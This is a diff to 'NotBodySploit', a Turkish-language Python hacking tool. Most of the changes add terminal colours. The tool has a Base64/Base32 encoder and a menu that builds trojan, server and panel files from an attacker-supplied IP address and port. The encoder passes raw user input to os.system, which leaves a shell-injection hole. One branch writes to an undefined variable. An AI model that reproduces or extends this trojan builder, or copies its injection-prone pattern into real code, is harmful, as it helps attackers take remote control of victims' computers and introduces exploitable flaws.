@@ -10,6 +10,7 @@ def clear():
         _ = os.system('clear')
     else:
         _ = os.system('clear')
+os.system("xtitle NotBodySploit")
 clear()
 ressamnotbody = """\033[94m\033[1m
                                                                              
@@ -28,24 +29,24 @@ ressamnotbody = """\033[94m\033[1m
 ;   |.'                   ---`-'  |   | ,'              \   \  /     :  \  \ 
 '---'                             `----'                 `----'       \  ' ; 
                                                                        `--`  
-        Instagram: https://www.instagram.com/notbodyofficial/
+       \033[93m Instagram: https://www.instagram.com/notbodyofficial/\033[94m\033[1m
 
-        Git-Hub: https://github.com/not-body/      V 1.0                                                                                                           
+       \033[93m Git-Hub: https://github.com/not-body/  \033[94m\033[1m    V 1.1                                                                                                          
                      
                                                   """
-anamenu = """
+anamenu = """\033[91m
 1 ) Şifrelemeler
 2 ) Trojan
 """
-neyapakaq = """
+neyapakaq = """\033[91m
 1 ) Şifrele 
 2 ) Şifre Çöz
 """
-sifmenu = """
+sifmenu = """\033[91m
 1 ) Base64
 2 ) Base32
 """
-trojanban = """ 
+trojanban = """ \033[91m
 1 ) .py Trojan
 2 ) .py Server
 3 ) .py Panel
@@ -154,72 +155,74 @@ exit()
 
 print(ressamnotbody)
 print(anamenu)
-body = input("Lütfen İşlem seçiniz: ")
+body = input("\033[92m Lütfen İşlem seçiniz: ")
 clear()
 if(body == "1"):
     print(ressamnotbody)
     print(neyapakaq)
-    sec = input(" Lütfen İşlem Seçiniz:")
+    sec = input("\033[92m Lütfen İşlem Seçiniz:")
     if(sec == "1"):
         clear()
         print(ressamnotbody)
         print(sifmenu)
-        sif = input(" Şifreleme Yöntemi Seçin: ")
-        mtn = input(" Şifrelenecek metini Girin: ")
+        sif = input("\033[92m Şifreleme Yöntemi Seçin: ")
+        mtn = input("\033[92m Şifrelenecek metini Girin: \033[91m")
         if(sif == "1"):
-            print("Sonuç : \033[91m")
+            print("\033[92m  Sonuç : \033[91m")
             os.system("echo -n {} | base64".format(mtn))
             print(n)
         elif(sif == "2"):
-            print("Sonuç : \033[91m")
+            print("\033[92m  Sonuç : \033[91m")
             os.system("echo -n {} | base32".format(mtn))
             print(n)
         else:
-            print("Bir Şeyler Yanlış Gitti")
+            print("\033[91mBir Şeyler Yanlış Gitti")
     elif(sec == "2"):
         clear()
         print(ressamnotbody)
         print(sifmenu)
-        sif = input("Şifreleme Türü Seçiniz: ")
-        mtn = input("Çözülücek Metini Girin: ")
+        sif = input("\033[92m Şifreleme Türü Seçiniz: ")
+        mtn = input("\033[92m Çözülücek Metini Girin: \033[91m")
         if(sif == "1"):
-            print("Sonuç : \033[91m")
+            print("\033[92m  Sonuç : \033[91m")
             os.system("echo -n {} | base64 -d".format(mtn))
             print(n)
         elif(sif == "2"):
-            print("Sonuç : \033[91m")
+            print("\033[92m  Sonuç : \033[91m")
             os.system("echo -n {} | base32 -d".format(mtn))
             print(n)
         else:
-            print("Bir Şeyler Yanlış Gitti")
+            print("\033[91mBir Şeyler Yanlış Gitti")
+            exit()
     else:
-        print("Bir Şeyler Yanlış Gitti")
+        print("\033[91mBir Şeyler Yanlış Gitti")
+        exit()
 elif(body == "2"):
     clear()
     print(ressamnotbody)
     print(trojanban)
-    a = input("Lütfen Size Uygun Dosyayı Seçiniz: ")
-    b = input("İp Adresiniz: ")
-    c = input("Port: ")
-    d = input("Dosya Adı: ")
+    a = input("\033[92m Lütfen Size Uygun Dosyayı Seçiniz: ")
+    b = input("\033[92m İp Adresiniz: ")
+    c = input("\033[92m Port: ")
+    d = input("\033[92m Dosya Adı: ")
     if(a == "1"):
-        print("Dosya Oluşturuluyor..")
+        print("\033[94mDosya Oluşturuluyor..")
         time.sleep(1) 
         gbc = open(d, "w+")
         gbc.write(trojan.format(c, b))
-        print("Dosya Oluşturuldu.")
+        print("\033[95mDosya Oluşturuldu.")
     elif(a == "2"):
-        print("Dosya Oluşturuluyor..")
+        print("\033[94mDosya Oluşturuluyor..")
         time.sleep(1)
         gfb = open(d, "w+")
         gfc.write(server.format(b, c))
-        print("Dosya Oluşturuldu.")
+        print("\033[95mDosya Oluşturuldu.")
     elif(a == "3"):
-        print("Dosya Oluşturuluyor..")
+        print("\033[94mDosya Oluşturuluyor..")
         time.sleep(1) 
         gfj = open(d, "w+")
         gfj.write(trojan.format(c, b))
-        print("Dosya Oluşturuldu.")
+        print("\033[95mDosya Oluşturuldu.")
 
 
 
@@ -228,7 +231,7 @@ elif(body == "2"):
 
 
 else:
-    print("Yanlış Giden Bir Şeyler Var")    
+    print("\033[91mYanlış Giden Bir Şeyler Var")    
     exit()
         
     
